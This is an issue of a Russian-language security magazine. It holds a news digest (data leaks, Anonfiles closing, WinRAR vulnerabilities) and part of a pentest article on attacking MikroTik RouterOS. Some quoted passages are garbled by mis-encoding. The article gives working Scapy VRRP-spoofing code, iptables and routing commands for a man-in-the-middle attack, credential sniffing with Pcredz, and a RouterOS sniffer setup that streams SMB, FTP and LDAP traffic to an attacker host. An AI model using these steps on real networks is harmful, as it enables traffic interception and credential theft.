  В Рос комнадзоре под счи тали, что за пос ледние два года количество утечек персональных дан-
   ных поль зователей вырос ло почти в 40 раз. Если в 2021 году таких инци дентов было всего 4
    (утекли 2,7 миллиона записей), то в 2022 году — свыше 140 (600 мил лионов записей), а за
   пер вые семь месяцев 2023 года уже произошло свыше 150 уте чек.

  В нас тоящее время в России нас читывается не менее 5,5 миллиона структур, име ющих дос-
   туп к час тной информации. Рос комнадзор разработал рекомен дации для всех опе раторов пер-
   сональных данных. В час тнос ти, в ведомстве предлагают минимизиро вать перечь персональ-
   ных дан ных, исполь зуя толь ко те, которые действитель но необходимы для ока зания услуги.
   А так же настаивают на «дроблении» личных сведений, то есть хра нении каждых кон кретных
   данных о человеке (имя, номер телефона, покуп ка) в разных базах.

 ANONFILES
 ЗАКРЫЛСЯ





  По пулярный сервис для ано нимного обме на файлами Anonles зак рылся. Его
  адми нистраторы заяви ли, что больше не могут справляться с огромным
  количеством зло употреблений со стороны пользователей.
    Дело в том, что Anonles был одним из наиболее популяр ных фай лооб-
  менни ков сре ди преступников, которые исполь зовали его для обме на
  образцами украденных дан ных, логинов и паролей, а так же матери алов,
  защищенных автор ским правом. Как оказалось, это не устра ивало его адми-
  нистраторов.
    При этом не раз отмечалось (1, 2, 3), что сайт имел дело с сомнительными
  рекламода теля ми, которые неред ко перенаправля ли людей на страницы
  с вре донос ным ПО и нежелательными рас ширениями для браузеров Google
  Chrome и Firefox, а так же в фальшивую техническую поддер жку.
     Нап ример, при попытке скачать файл с Anonles пользовате лей сначала
  перенаправляли на сайт, который загружал файл ISO с тем же именем. Такой
  ISO мог содер жать вре донос ные прог раммы, в том чис ле инфостилеры, тро-
  яны удаленного доступа и рекламные кли керы.
     Также в 2021 году исследователи предуп реждали, что вредонос ная рек-
  лама на Anonles распростра няет извес тный инфостилер RedLine, а кроме
   того, на сайте были замечены кам пании по рас пространению ботнета
  Amadey, сти лера Vidar и вымогателя STOP.





  Однако теперь операторы Anonles закрыли сер вис, заявив, что их прок-
  си-провай дер недавно отклю чил их и они боль ше не могут справляться
  с огромным количеством нарушений.
    Ниже приводим заявление администра ции Anonles полностью.


        «Ïîñ ëå äâóõ ëåò áåñ êîíå÷ íûõ ïîïûòîê çàïóñ òèòü àíîíèì íûé ôàéëîîá-
        ìåííûé ñàéò ìû óñòà ëè îò îãðîìíîãî êîëè÷åñ òâà çëîóïîòðåáëå íèé «
        è ãîëîâ íîé áîëè, êîòîðóþ ýòî íàì ñîç äàâàëî.
        Ýòî ìîæåò áûòü òðóäíî ïîíÿòü, íî ïîñ ëå äåñÿòêîâ ìèëëèîíîâ çàãðóçîê
        è ìíîãèõ ïåòàáàéòîâ äàííûõ âñÿ ðàáîòà ïî áîðüáå ñî çëîóïîòðåáëå-
        íèÿìè áûëà àâòîìàòèçèðîâàíà ïî âñåì äîñ òóïíûì êàíàëàì, ÷òîáû
        áûòü ìàê ñèìàëüíî áûñ òðîé.
      Ìû àâòîìàòè÷åñ êè áàíèëè êîíòåíò ñîòåí òûñÿ÷ ôàéëîâ. Ìû çàï-
        ðåùàëè èìå íà ôàéëîâ è çàï ðåùàëè êîíêðåòíûå ïàòòåðíû èñïîëü-
         çîâàíèÿ, ñâÿçàííûå ñî çëîóïîòðåáëå íèÿìè. Äîø ëî äî òîãî, ÷òî íàñ
        íå âîëíîâàëî, åñëè â ïðîöåñ ñå ìû ñëó ÷àéíî ïîëó÷à åì òûñÿ÷è ëîæíûõ
         ñðà áàòû âàíèé è óäà ëåíèé.
        Íî äàæå ïîñ ëå âñå ãî ýòîãî êîëè÷åñ òâî çëîóïîòðåáëå íèé íå óìåíü-
         øèëîñü.
        Ýòî íå òà ðàáîòà, êîòîðóþ ìû ïðåäñòàâ ëÿëè ñåáå, êîãäà áðà ëèñü
         çà ýòî. À íåäàâ íî íàø ïðîê ñè ïðîâàéäåð íàñ îòêëþ ÷èë.
         Òàê áîëüøå ïðîäîëæàòüñÿ íå ìîæåò.
       Äîìåí ïðîäàåòñÿ».                 »

  ХАКЕРОВ ТОЖЕ ВЗЛАМЫВАЮТ
   Эк сперты Hudson Rock изучили око ло 100 хакфорумов и обнаружи ли, что сами зло умышленни-
   ки нередко становят ся жертвами: их системы заражает вредонос ное ПО, похищая учет ные дан-
   ные от сай тов для кибер преступников.

   Всего было обнаружено около 100 000 взломанных компьюте ров, принадлежащих хакерам,
   а количество учет ных данных от разных хакфорумов пре высило 140 000.

   Ока залось, что более 57 000 ском прометированных поль зователей име ли аккаунты в сооб-
   ществе nulled[.]to для начинающих киберпрес тупников. На вто рое и третье мес та попали
   чуть менее популярные хакерские сайты cracked[.]io и hackforums[.]net.





   Утек шие пароли от форумов для киберпреступников чаще ока зывались более надеж ными, чем
   учет ные данные для государс твенных сайтов.





   Самые надеж ные пароли из  всех  изучен ных продемонс трировали  учас тники  хакфорума
   Breached: более 40% учет ных данных здесь имеют длину не менее 10 символов и содержат
   сим волы четырех типов.





                                        Продолжение статьи →
← Начало статьи
 MICROSOFT
 НЕ ПРОДЛИТ
 ЛИЦЕНЗИИ





  Компания Microsoft сооб щила российским клиентам, что лицензии на продук-
  ты и решения ком пании не будут прод леваться после 30 сентября 2023 года.
  Уже активные лицензии продолжат дей ство вать и после этой даты, но только
  до конца оставше гося срока.
    В распоряжении СМИ ока залось письмо от службы поддер жки Microsoft
   Online Services, направленное одному из клиентов. Оно гласит, что пос-
  ле 30 сентября текуще го года рос сийские корпоративные клиенты не смогут
  прод лить подписку.





   Microsoft поясняет, что больше не может принимать платежи на мес тный бан-
   ковский счет в качестве опла ты своих услуг в Рос сии. Поэтому компания
  за 60 дней уве дом ляет кли ента о том, что после 30 сентября прод лить сущес-
   твующие подписки уже не получится, а активные лицензии продолжат
  работать лишь до истечения их сро ка.

          «Microsoft ïðèîñòà íàâ ëèâà åò çàïóñê íîâûõ ïðîäóê òîâ, ïðîäàæó ñåð-
         âèñîâ è ìíîãèå äðó ãèå àñïåêòû ñâîåé äåÿòåëüíîñ òè â Ðîñ ñèè â ñîîò- «
         âåòñ òâèè  ñ  ñàíêöèÿìè  ñî  ñòîðîíû  Åâðîñîþçà,  Âåëèêîáðèòàíèè
        è ÑØÀ», — ïðîêîì ìåíòèðîâà ëè â êîì ïàíèè èçäà íèþ Forbes.                 »
  Собс твенные источни ки изда ния в IT-отрасли отметили, что сейчас долю
   Microsoft в госсекторе, в компани ях с госучастием и среди корпоративных
   клиентов мож но оце нить в 80%, хотя еще год назад она составляла око-
  ло 90%, а два года назад — 95–96%.
     Заместитель  председателя  комитета  Госдумы  по  информа ционной
  полити ке, информационным технологиям и связи Андрей Свинцов заявил
  СМИ, что, по его мнению, «в ближай шие полгода-год все рос сийские аналоги
   будут дорабо таны и постепен но будет проведе но импортозаме щение».


        «Åùå  êàêîé òî  ïåðèîä  áîëüøèíñ òâî  ïðîãðàì ìíûõ  ïðîäóê òîâ
           [Microsoft] áóäóò ïðîäîëæàòü ðàáîòàòü, ïðîñ òî áåç îáíîâëå íèé. Ïîíÿò- «
        íîå äåëî, ÷òî íàøè ñïå öèàëèñ òû ïðàê òè÷åñ êè óæå âñå ïðîãðàì ìíûå
        ïðîäóê òû ðàñ ïàðîëèëè, è èìè óæå ìîæíî ïîëüçîâàòüñÿ ïî ñåðîé ñõå-
         ìå. Áîëüøîå êîëè÷åñ òâî îòå ÷åñ òâåííûõ ïðîãðàì ìíûõ ïðîäóê òîâ óæå
        âíåä ðÿåòñÿ ïîâ ñåìåñ òíî. Íà ñåãîäíÿøíèé äåíü íå âñå åùå ôóíêöèè,
         àíà ëîãè÷ íûå çàïàä íûì ïðîäóê òàì, åñòü, íî ïî êðàéíåé ìåðå áàçîâî
        óæå ïîëüçîâàòüñÿ ìîæíî», — çàÿâ ëÿåò äåïóòàò.                 »

  ТРАФИК С РФ ВЫРОС В 11 РАЗ

  В середи не августа Мин цифры опубликовало проект стратегии раз вития отрасли связи
   до 2035 года. Согласно этому документу, объем интернет-трафика в интернете в Рос сии
   в 2022 году вырос более чем в 11 раз в сравнении с 2012 годом и дос тиг поч ти 124 эксабайт.

   Изначально (в 2012 году) тра фик сос тавлял 11,1 эксабайт. То есть более чем за десять лет
   изме рений тра фик вырос свыше чем в 11 раз, а в год он рос в среднем на 27%.

   Эк сабайт равен десяти в 18-й степени, то есть квинтиллиону байт.

 БЕЗЛИМИТНОГО
 DROPBOX НЕ БУДЕТ





  До недав него времени в Dropbox можно было под ключить без лимит ный
  тариф ный план Dropbox Advanced для бизнеса, сто имостью 24 доллара
   в месяц. Этот тариф предоставлял неог раниченный объем хранили ща, чтобы
  бизнес-поль зователи могли не беспоко иться о лимитах. К сожалению, теперь
   от этого решено отказаться, так как некото рые пользовате ли активно зло-
   упот ребляли воз можнос тями Dropbox Advanced.
    Компания сооб щает, что перес танет предос тавлять неог раниченное хра-
  нилище дан ных потому, что люди часто покупают аккаунты Dropbox Advanced
  «для таких целей, как майнинг криптовалют и Chia, объединение хранилищ
  для личных нужд не связанных меж ду собой лиц и даже для перепродажи».
     Dropbox объясняет, что такие кли енты использовали в тысячи раз больше
  дискового пространства, чем настоящие бизнес-клиенты.
     Чтобы не тратить ресурсы на борьбу со злоупот реблениями, Dropbox вво-
   дит ограничение в 15 Тбайт для организаций с тре мя и менее пользовате-
   лями. Сверх это го лимита на каж дого пользователя может быть добавлено
  еще  5  Тбайт,  а  максимальный  размер  хранилища  теперь  составля-
   ет 1000 Тбайт на организацию.
    Новых поль зователей изменения коснутся сразу, а существующие поль-
  зователи будут пос тепенно переведены на новые тарифные планы с 1 ноября
  текуще го года, о чем их уве домят не менее чем за 30 дней до перехода.
     Чтобы помочь нас тоящим бизнес-кли ентам перейти на новый режим
  работы, Dropbox анонсирует, что клиенты, исполь зующие менее 35 Тбайт
  дискового пространства на одну лицен зию, смогут сохранить прежний объ ем
  хранили ща, а также получат еще 5 Тбайт в течение пяти лет без дополнитель-
  ной оплаты.


  TELEGRAM ОБОШЕЛ «ВКОНТАКТЕ»

   Согласно статистике Mediascope, этим летом Telegram обог нал «Вконтакте» по размеру днев-
   ной ауди тории в России, установив новый рекорд.

  В июле 2023 года показатель днев ной аудитории Telegram сос тавил 54,3 миллиона человек,
   то есть на 1,7 миллиона больше, чем у «Вконтакте» (52,6 миллиона).





   По срав нению с июнем за месяц аудитория Telegram вырос ла на 2,4 миллиона человек
     (4,6%).

   Таким обра зом, Telegram и «Вконтакте» в России обгоняют YouTube по среднесуточному охвату.





   Тем не менее месячная аудитория YouTube все же остается самой большой — в июле она пре-
   выси ла 95,5 мил лиона человек. Для «Вконтакте» этот показатель составляет 87,6 мил лиона
   поль зователей, для Telegram — 81,2 миллиона.

 WINRAR АТАКУЮТ





  В августе в WinRAR был обна ружены и исправ лены сра зу две уязвимос ти,
  одна из которых пред ставляла собой 0-day, то есть уже использовалась
  хакерами.
    Первая уязвимость, CVE-2023-40477, позволяла добиться выполнения
  про извольного кода в целевой системе, и для эксплу атации проблемы дос-
   таточно было вынудить жертву открыть архив RAR.

        «Íåäîñ òàòîê ñâÿçàí ñ îáðà áîòêîé òîìîâ âîñ ñòà íîâ ëåíèÿ  (recovery
          volumes), — ïèñàëè ñïå öèàëèñ òû Zero Day  Initiative, îáíà ðóæèâ øèå «
          áàã. — Ïðîáëåìà âîç íèêà åò èç çà îòñóòñ òâèÿ íàä ëåæàùåé ïðîâåð êè
        ïðå äîñ òàâëÿåìûõ ïîëüçîâàòå ëåì äàííûõ, ÷òî ìîæåò ïðèâåñ òè ê îáðà-
       ùåíèþ ê ïàìÿòè çà ïðå äåëà ìè âûäåëåííîãî áóôåðà».                 »
  Пос коль ку атака все же требует вза имо дей ствия с поль зователем (ведь цель
  должна открыть архив), уяз вимость набрала 7,8 балла из 10 воз можных
  по шкале оценки уязвимостей CVSS, то есть не считается критической. Одна-
   ко обманом вынудить пользователя открыть архив не так уж слож но, а учи-
  тывая огромный объем поль зовательской базы WinRAR, уяз вимость может
  представ лять большую опасность.
     Вто рая уязвимость, CVE-2023-38831, оказалась проб лемой нулево го дня.
  По информации Group-IB, проблема активно использовалась зло умышленни-
  ками для установки малвари, а для экс плуата ции бага дос таточно было
  вынудить жер тву открыть безобидный файл из архива (в формате JPG, TXT
  и других).
    Иссле дователи рас сказали, что хакеры использовали уязвимость с апре-
  ля 2023 года, чтобы распространять различные семейства вре доносных
  программ, вклю чая DarkMe, GuLoader и Remcos RAT.
    В основном атаки были обнаружены на форумах, посвященных тор говле
  крип товалю тами. Там хакеры притворялись энтузиастами, делящимися сво-
  ими торговыми стратегиями с другими трейдерами. К сообщени ям злоумыш-
  ленники  прик ладывали  ссылки  на  специально  подготовленные  архивы
  WinRAR, которые якобы содер жали детальную информацию о торговой стра-
   тегии (PDF, тексто вые файлы и изображения).





  Вредоносные архи вы распространялись как минимум на вось ми откры тых
  трей дерских  форумах,  и  с  их помощью  были  зараже ны  устрой ства
  не менее 130 пользователей. При этом общее чис ло жертв этой кампании
  и их финансовые потери пока неизвестны.
     Откры вая вре донос ный архив, жертвы видели лишь набор безобидных
  на первый взгляд файлов, включая уже упомяну тые PDF, текстовые файлы,
  а также изображения в форматах JPG, PNG и про чих.
    Но если пользователь кликал на такой PDF или картинку, благодаря уяз-
  вимос ти  CVE-2023-38831  запускался  скрипт  для  установки  малвари.
  При этом скрипт также заг ружал и показы вал пользователю документ-фаль-
  шив ку, что бы не вызывать подоз рений.





  В ито ге скрипт использовался для запуска самораспаковы вающегося (SFX)
  CAB-архи ва, который заражал компь ютер малварью (DarkMe, GuLoader
  и Remcos RAT), обеспечивая зло умышленни кам удаленный доступ к заражен-
  ному устройству и позволяя похитить крип товалютные активы жер твы.
    Обе опи санные выше проблемы были устра нены в начале августа, когда
  ком пания RARLAB выпустила обновленный WinRAR 6.23. Теперь пользовате-
  лям WinRAR рекомендуется как можно скорее уста новить эту версию, чтобы
  защититься от воз можных атак.





   Ученые нашли способ автоматизировать создание вредонос ных запросов для чат-ботов
   с искусс твенным интеллектом


   CISA, АНБ и ФБР составили спи сок самых экс плу атируемых уязвимостей


   Ата ка позволяет восстанавливать данные по зву ку нажатий клавиш


   SentinelOne: северокорей ские хакеры взломали «НПО машинос троения», про изво дящее ракеты


   0-day-уязвимос ти под общим названием BitForge угрожают криптовалют ным кошелькам


   Подрос тки взломали транспортные карты метро Бос тона, вдохновив шись ата кой 2008 года


    Discord(.)io под твердил утечку данных 760 тысяч пользовате лей


   «Ростелеком» тестирует внут ренний сервис для доступа к YouTube


   Microsoft добавляет под держку Python в Excel


   Tor-сервисы защитят от атак при помощи proof-of-work
COVERSTORY





ПЕНТЕСТИМ СЕТЕВОЕ
ОБОРУДОВАНИЕ
MIKROTIK





Это авторское исследование о безопас-
ности обо рудования MikroTik с точки зрения
атакующего. Обо рудо вание MikroTik крайне
популяр но и нередко становит ся жертвой
разных атак. Я сде лаю акцент на постэкс-               Caster                                                                                        Network Security Expert
плуатации.   Также   затрону   проблему             @wearecaster
безопасности   защитных   механизмов
RouterOS, недостатками которых пользуют-
ся атакующие.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÏÐÎÁËÅÌÛ ÑÅÒÅÂÎÉ ÁÅÇÎÏÀÑÍÎÑÒÈ

У RouterOS есть несколько проб лем сетевой безопас ности. Давай пос-
мотрим, на какие из них сто ит обратить внимание в первую очередь.


DAI
RouterOS не в состоянии защитить сеть от ARP Spoong за исключени ем
использования режима reply-only в конфигурации bridge. По фак ту этот
режим работы представляет собой статическую ARP-таб лицу, которую в кор-
поратив ных сетях вести нерентабель но, так как при появлении каждого
нового хоста придется заходить на устройство и заносить MAC и IP вручную.
Спо соб  дей ственный,  однако  малопривлекательный  из-за  боль ших
неудобств. Поэтому, встретив обо рудование MikroTik, атакующий в большинс-
тве случаев может не отказывать себе в ARP-спуфинге: ему не стоит ожидать
вне зап ной тре воги ARP Inspection, ведь этого механизма в RouterOS, по сути,
нет.


RA Guard
RA Guard представ ляет собой функцию безопасности, которая отсе кает
несанкци они рованные router advertisements внутри сети с целью предотвра-
щения MITM-атак. RA Guard полностью отсутствует в RouterOS и Switch OS,
обо рудованию абсо лютно нечем ответить на популярный инс тру мент пен-
тестеров — mitm6. Единственный вариант, который остается, — фильтровать
на уровне бриджа по MAC-адре сам наз начения.
  Почему у девайсов MikroTik нет таких важных функций безопасности —
непонятно. Такое ощущение, что их ПО застря ло в девяностых.


Àáüþç DP
RouterOS по умолчанию выполняет рас сылку Discovery-протоколов, которые
могут раскрыть чувствительную информацию о себе потенциальному ата-
кующему. В RouterOS активны три Discovery-протокола:
 • CDP (Cisco Discovery Protocol);
 • LLDP (Link Layer Discovery Protocol);
 • MNDP (MikroTik Neighbor Discovery Protocol).

Ата кующий может получить чувстви тель ную информа цию в виде версии про-
шив ки, адресации, име ни устройства, номера модели оборудования MikroTik.
Вектор край не специфичес кий, одна ко все же может при меняться.





               При мер захваченного MNDP-тра фика


ÑÏÓÔÈÍÃ Â ÑÈÑÒÅÌÅ ÐÅÇÅÐÂÈÐÎÂÀÍÈß VRRPV3

VRRP (Virtual Router Redundancy Protocol) — это протокол резервирования
маршрутизаторов на уровне L3, в его осно ве лежит принцип создания вир-
туального мар шрутиза тора за счет объ единения физичес ких маршру тиза-
торов в одну логическую груп пу. Затем созданному виртуальному роутеру
присваивается IP-адрес, который, в свою очередь, назнача ется как шлюз
по умолчанию для конечных станций.
  По своему опы ту скажу, что в RouterOS в боль шинстве случаев исполь-
зует ся конфигурация VRRPv3 по умолчанию, адми нистраторы в основном
нас траивают толь ко приори тет и номер группы, а версию и аутентифика цию
обычно не затрагивают. Это и открывает дорогу для эксплуатации со стороны
ата кующе го.
  Ниже — пример такой конфигурации по умолчанию.





                 Конфигурация VRRPv3 по умолчанию

Спуфинг MASTER-роли в VRRP при водит к MITM-атаке в отношении целой
под сети, что может быть очень критично во время пентеста. Ста новит ся воз-
можным перехват чувстви тельных данных, ата ка Evil Twin, даже Relay-атаки
про тив сетей Windows.


Ïåðå÷èñëåíèå èíôîðìàöèè
Прежде чем использовать другие техники, нужно провес ти перечисление
информации о домене VRRP. Нужны данные об используемом виртуаль ном
адресе, наличии аутентифика ции, номере груп пы VRRP и зна чении приори-
тета.
   Вот при мер пакета VRRP. В контексте домена VRRP-пакеты отправляет
только MASTER-устройство.





                     Захваченный VRRPv3-пакет

Здесь мы видим, что:
 • ис поль зуется третья версия VRRP;
 • от сутствует аутентификация (типично для VRRPv3);
 • номер группы VRRP — 1;
 • приори тет — 190.


Èíúåêöèÿ
Глав ный аспект этой атаки — инъекция вре доносного пакета VRRPv3 с мак-
симальным значением приори тета. Есть даже такая прак тика безопас ности,
где рекомендует ся ставить наивысший приоритет 255, однако для VRRP мож-
но уста новить такое значение мак симум до 254, так как значение 255 уходит
занимаемому мастеру. После такой инъекции ата кующий перех ватывает роль
MASTER и начинает сам обслуживать тра фик сети. Даже нес мотря на то, что
воз ника ет MITM, нельзя нарушать нормальное функци они рование  сети,
а поэтому при дется порабо тать над схе мой маршрутизации на хосте ата-
кующего.
  В качестве лабора тор ного стенда выступает сле дующая сеть.





                 Схема лаборатор ной сети с VRRPv3

Са му инъекцию я сде лал с помощью Scapy, мне понадобился модуль scapy.
layers.vrrp для работы с про токолом VRRP. Пакет будет выг лядеть пример-
но сле дующим образом. Оставлю акцент на зна чени ях именно слоя VRRPv3.
На самом деле это часть кода всего спуфера, функция inject при нимает
входные данные на осно ве аргу ментов (я использовал библиотеку argparse).


def inject(interface, group, attackerip):
    L2frame = Ether()
    L3packet = IP(src=args.attackerip, dst="224.0.0.18", ttl=255)
    vrrpv3inj = VRRPv3(version=3, type=1, vrid=args.group, priority=
255, ipcount=1, addrlist=['10.10.100.254'])
    crafted = L2frame / L3packet / vrrpv3inj
    sendp(crafted, iface=args.interface, inter=1, loop=1, verbose=1)

Здесь
 • type=1  значит,  что  этот  VRRP-пакет  выполняет  роль  объявления
  Advertisement;
 • priority=255 — мак симальный приоритет для инъ екции;
 • ipcount=1 — количество IP-адресов у MASTER-устройства. Атакующий
   будет владеть толь ко одним IP-адре сом;
 • addrlist=['10.10.100.254']  ука зывает на  то, каким  IP-адресом
   будет владеть ата кующий при перехвате MASTER-роли, оформляется
   в виде списка в коде на Python;
 • inter=1 — пакет VRRPv3 будет генери ровать ся каждую секунду, посколь-
   ку легитимный девайс тоже отправляет их каж дую секунду. Грубо говоря,
   это спе циальные Hello-сообщения, которые оповещают, что MASTER
   в порядке и про должает свою работу. Однако, если в течение трех секунд
   сообщения не последует, один из резервных роутеров заменит MASTER;
 • loop=1 указывает на то, что пакет будет отправляться бесконечно.


GARP-êàäð
Когда роутеры меня ются ролями, они отправ ляют спе циальные сообщения
Gratuitous ARP, которые объявляют на весь VLAN, что возникла новая привяз ка
IP и MAC-адре са, спе циальная модификация ARP-кадра. Когда новое устрой-
ство становится MASTER, ему необходимо объявить это и на уровне ARP,
с помощью GARP-рассылки. Атакующему тоже пред стоит это сде лать, чтобы
избежать DoS. Для этого у меня есть инструмент Cruelty, который генерирует
и отправ ляет необходимые кад ры GARP.


caster@kali:~$ sudo python3 Cruelty.py --interface ethX --mac XX:XX:
XX:XX:XX:XX --gateway X.X.X.X


Óêëîíåíèå îò òðàññèðîâêè
Со стороны пользовательско го компьюте ра мож но опре делить атакующего
в тот момент, ког да он проводит трас сировку. Атакующий может избежать
этого, если сместит TTL с инкрементом +1 в таблице Mangle и в цепочке
PREROUTING.


caster@kali:~$ sudo iptables -t mangle -A PREROUTING -i ethX -j TTL
--ttl-inc 1


Ïðîáëåìà àñèììåòðè÷íîé ìàðøðóòèçàöèè
Во вре мя MITM-ата ки возникает асимметричная маршру тиза ция — явле ние,
при котором трафик отправляется одним путем, а воз вращает ся другим.
Это может при вести к тому, что атакующий пропус тит мимо себя другую
половину трафика, потен циально потеряв чувстви тель ные данные. Чтобы
решить эту проблему, необ ходимо спе циальное правило MASQUERADE в таб-
лице NAT, в цепоч ке POSTROUTING.


caster@kali:~$ sudo iptables -t nat -A POSTROUTING -o ethX -j
MASQUERADE





       Прохождение тра фика при асимметричной мар шрутизации





    Прохождение трафика пос ле MASQUERADE на стороне атакующе го


Ìàðøðóòèçàöèÿ
Пос ле инжекта необходимо заняться небольшим роутинг-менеджментом.
  Сперва нужно уда лить ста рый мар шрут по умолчанию (для атакующего
это был 10.10.100.254). Так как ата кующий стал новым MASTER-маршрутиза-
тором, мы — владельцы этого виртуального адреса (10.10.100.254), но при
ста ром маршруте весь трафик замыка ется на нашей ОС, что без допол-
нительной мороки вызывает DoS на легитимные хос ты. Пропишем новый
маршрут по умол чанию через 10.10.10.100 (это бывший MASTER-роутер),
но даже несмотря на то, что мы отжа ли у него роль MASTER, он все равно
сможет выпол нить маршру тиза цию трафика, куда нам нужно.


caster@kali:~$ sudo route del default
caster@kali:~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.
100.100

Также надо создать на интерфейсе вто ричный адрес со значением VRRP
Virtual IP Address (10.10.10.254). Опять же после ата ки мы стали владельцами
этого адре са.


caster@kali:~$ sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.
255.0


Èìïàêò
Пос ле всех этих манипуляций атакующий воспроизво дит MITM и может прос-
лушивать  трафик  внутреннего  сегмента,  в котором сам и  находит ся.
Облегчить поиск учетных данных в трафике может инструмент Pcredz:


caster@kali:~/mikrotiknightmare/Pcredz$ sudo python3 Pcredz -i eth0





        Пе рех ваченный NetNTLMv2-SSP пользователя claymore

Также важно, чтобы твое железо выдержало такую наг рузку: учитывай мощ-
ности процессора и скорость интерфей са. Такой спуфинг приводит к тому,
что весь трафик под сети пой дет в твою сто рону. Так же можешь не бояться
за чистоту этой атаки. Когда ты прекратишь VRRP-инъекцию, легитимные
VRRP-роутеры снова проведут сог ласование и сеть вернется на круги своя.
Да и Dead Timer в сетях VRRP обычно очень маленький, сеть быс тро восста-
новится, и будет назначен легитим ный MASTER.




Чи тай так же мою статью «Caster Remix. Используем вир туальный MikroTik
для пос тэксплуата ции Windows». В ней я предлагаю новый способ организа-
ции быстрого L2-туннелирования про тив машин Windows. Главный эле мент
этой техники — виртуальный маршрутизатор MikroTik CHR, возможности
которого позволяют обеспечить перемещение по сети.



ROUTEROS TRAFFIC HIJACKING

Я покажу спе цифичес кий вектор атаки при пос тэксплу атации, при котором
ата кующий может перехватывать трафик внут ри инфраструктуры, не влияя
на нормальную работу сети.


GreenDog — Easy Hack #196 (Caster Bootleg)
Ис сле дователь безопас ности Алексей Тюрин в своем релизе Easy Hack #196
про демонстри ровал технику перехвата трафика с устрой ств Cisco с исполь-
зованием SPAN. SPAN — это по факту ана лог Packet Sniffer в RouterOS
и выпол няет те же функции, одна ко при настройке классичес кого SPAN
на ком мутаторе: порт перес тает работать в обычном режиме, из-за чего
у ата кующего теряется связность с сетью. Решение проблемы — исполь-
зовать ERSPAN, который поз воля ет не толь ко зеркалировать трафик, но и
отправ лять его куда угод но поверх GRE-инкапсуляции  (0x88BE). Однако
ERSPAN дос тупен толь ко на обо рудовании Cisco и в Linux.





               Описание этой техники от GreenDog

Но я нашел такой же вектор про тив RouterOS. Я буду использовать Packet
Sniﬀer,  который  может  выполнять  зеркалирование  трафика  с  любых
интерфейсов RouterOS. Импакт здесь в том, что атакующий может прос-
лушать чувствитель ную информацию, передаваемую внутри сети (например,
SMB, FTP, LDAP). Развить ата ку мож но откуда угодно: зеркалированный тра-
фик все равно сможет достичь хоста ата кующего, так как используется TZSP-
инкапсуляция, то есть зеркалирован ный трафик может переда ваться поверх
соединений L3.


TZSP
TZSP (Tazmen Sniﬀer Protocol) — сетевой протокол инкапсу ляции, который
может заворачивать в себя дру гие сетевые про токолы, грубо говоря —
обрамляет полез ную нагрузку. Обычно исполь зуется в сетях 802.11, может
работать с IDS. TZSP использует для инкапсуляции протокол UDP, значит,
не исклю чены потери. TZSP спо собен инкапсулировать сетевой трафик,
начиная с уровня L2, то есть может переда вать Ethernet-фрей мы.
   Вот небольшой пример инкапсулиро ванного FTP-тра фика с TZSP.





                  FTP-трафик под TZSP-инкапсуляцией




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ




              ПЕНТЕСТИМ СЕТЕВОЕ ОБОРУДОВАНИЕ
                                         MIKROTIK




Packet Sniﬀer из RouterOS как раз таки и использует TZSP для инкапсуляции
полез ной нагрузки. Именно бла годаря этому зеркалированный трафик может
передаваться поверх L3-соеди нений.


Óãîí òðàôèêà
Для такой атаки злоумыш ленник должен определить сле дующие параметры:
 • IP-адрес streaming-сервера, куда будет поступать зеркалированный тра-
   фик;
 • целевые интерфей сы, с которых будет про водиться зеркалирование;
 • номер порта того протокола, которым интересуется атакующий.

Я для при мера рассматриваю сценарий, при котором атакующий перех-
ватывает трафик со всех интерфейсов, но только трафик протоколов SMB,
FTP, LDAP. При этом, конечно, желательно зеркалировать трафик, так как,
если зеркалиро вать всё подряд, это может соз дать большую нагрузку на сеть
и та может выйти из строя.
   Конфигура ция Packet Sniﬀer будет выглядеть сле дующим обра зом:


[caster@MikroTikNightmare] /tool/sniffer> set streaming-enabled=yes
filter-stream=yes streaming-server=10.10.100.90 filter-interface=all
filter-port=ftp,smb,ldap
[caster@MikroTikNightmare] /tool/sniffer> start

Здесь 10.10.100.90 — IP-адрес атакующе го хоста. Трафик будет зеркалиро-
вать ся со всех интерфейсов, зер калиру ются толь ко SMB, FTP и LDAP.





                      Схема зеркалиро вания


Îáðàáîòêà TZSP-çàãîëîâêîâ
Пос ле  запуска  сниффера  зеркалируемый  тра фик  будет  пос тупать
на интерфейс атакующего хоста, одна ко тра фик необ ходимо обработать,
сре зать TZSP-заголов ки, пос кольку нужды в них больше нет и они могут дос-
тавить хло пот.
  Для это го есть инструмент tzsp2pcap. Он позволяет удалять TZSP-заголов-
ки и экспортировать тра фик в формате pcap. В данном примере я буду
использовать Wireshark, в котором внедрю получен ный трафик без заголов-
ков TZSP:


caster@kali:~$ tzsp2pcap -f | wireshark -k -i -

Для демонстрации я ини циировал подключение по FTP, чтобы проверить
работоспособность такого вектора. Итог — на скриншоте.





Таким образом атакующий может перех ватывать трафик внут ри инфраструк-
туры, при этом не соз давая избы точный хоп. Снова довольно спе цифи ческий
вектор, но он имеет право на существование.


ROUTEROS PIVOTING

Настало время погово рить о пивотинге сквозь RouterOS. Это вектор постэкс-
плуата ции, при котором атакующий может про бить ся внутрь инфраструктуры.


L3 GRE VPN
Один из вари антов для пивотинга — использовать протокол GRE.
   Это про токол туннелирования L4, который поз воляет быс тро организовать
соединения site-to-site VPN. Получил известность благодаря тому, что настра-
ивается быстро и очень прос то. Разработан инженерами Cisco Systems,
однако под держивается любым вен дором. По умол чанию GRE не пре дос-
тавляет функций для шифрования тра фика внутри туннеля. Поэтому если он
и исполь зует ся в продак шене, то, ско рее всего, с груп пой протоколов IPSec.
  При постэксплуатации RouterOS ата кующий может вос пользоваться GRE-
туннелированием, что бы попасть внутрь инфраструктуры. Этот сценарий
работа ет именно с пограничным маршру тизатором.
  Примерно так будет выг лядеть карта пивотинга. Атакующий дол жен уста-
новить GRE-туннель между своей нодой и RouterOS, затем на логичес ких
интерфейсах необходимо настроить внутренние IP-адреса для сетевой связ-
ности. Затем, пос ле перечисления таблицы маршру тизации, атакующий
может создать спе циальные мар шруты, ведущие внутрь инфраструктуры,
и при этом шлюзом для таких маршру тов будет выступать дру гая сторона
GRE-туннеля.





               GRE меж ду атакующим и RouterOS

